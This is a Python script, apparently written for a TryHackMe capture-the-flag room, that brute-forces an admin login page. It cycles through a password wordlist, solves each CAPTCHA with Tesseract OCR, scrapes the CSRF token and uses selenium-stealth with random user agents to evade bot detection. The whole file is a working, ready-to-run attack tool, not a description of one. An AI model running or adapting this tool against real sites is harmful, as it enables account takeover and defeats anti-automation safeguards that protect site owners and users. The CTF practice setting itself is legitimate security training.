"""
CAPTCHA_goblin.py

Selenium + Tesseract OCR CAPTCHA bypass tool. Iterates through a password
wordlist, OCR-reads the CAPTCHA image rendered on the login page, and
distinguishes between CAPTCHA failure (retries same password with fresh
CAPTCHA) and password failure (moves on to next entry).

Used in the CAPTCHApocolypse TryHackMe CTF.

Dependencies:
  sudo apt install tesseract-ocr chromium-driver
  sudo apt install python3-selenium
  pip install pytesseract pillow selenium-stealth fake-useragent --break-system-packages
"""

from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth

import time
from fake_useragent import UserAgent
from PIL import Image, ImageEnhance, ImageFilter
import pytesseract
import io
import os

# Create folder for saving CAPTCHA images
os.makedirs("captchas", exist_ok=True)

options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument("start-maximized")
options.add_argument(f'user-agent={userAgent}')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-cache')
options.add_argument('--disable-gpu')

options.binary_location = "/usr/bin/chromium"
service = Service(executable_path='/usr/bin/chromedriver')
chrome = webdriver.Chrome(service=service, options=options)

stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

# CONFIG
ip = 'http://TARGET_IP'
login_url = f'{ip}/index.php'
dashboard_url = f'{ip}/dashboard.php'

username = "admin"
with open('top100.txt', 'r') as f:
    passwords = [line.strip() for line in f]

for password in passwords:
    while True:
        chrome.get(login_url)
        time.sleep(1)

        # Grab CSRF token
        csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")

        # Get CAPTCHA image rendered in-browser
        captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
        captcha_png = captcha_img_element.screenshot_as_png

        # Preprocess image for OCR
        image = Image.open(io.BytesIO(captcha_png)).convert("L")
        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)
        image = image.filter(ImageFilter.SHARPEN)
        image = ImageEnhance.Contrast(image).enhance(2.0)
        image = image.point(lambda x: 0 if x < 140 else 255, '1')

        # OCR the CAPTCHA
        captcha_text = pytesseract.image_to_string(
            image,
            config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
        ).strip().replace(" ", "").replace("\n", "").upper()

        # Save the image for review
        image.save(f"captchas/captcha_{password}_{captcha_text}.png")

        if not captcha_text.isalnum() or len(captcha_text) != 5:
            print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
            continue

        print(f"[*] Trying password: {password} with CAPTCHA: {captcha_text}")

        # Fill out and submit the form
        chrome.find_element(By.NAME, "username").send_keys(username)
        chrome.find_element(By.NAME, "password").send_keys(password)
        chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)
        chrome.find_element(By.ID, "login-btn").click()

        time.sleep(1)

        if dashboard_url in chrome.current_url:
            print(f"[+] Login successful with password: {password}")
            try:
                flag = chrome.find_element(By.TAG_NAME, "p").text
                print(f"[+] {flag}")
            except:
                print("[!] Logged in, but no flag found.")
            chrome.quit()
            exit()
        elif "CAPTCHA incorrect" in chrome.page_source:
            print(f"[!] CAPTCHA wrong (got '{captcha_text}'), retrying same password")
            continue  # retry same password with fresh CAPTCHA
        else:
            print(f"[-] Failed login with: {password}")
            break  # actual wrong password, try next

chrome.quit()
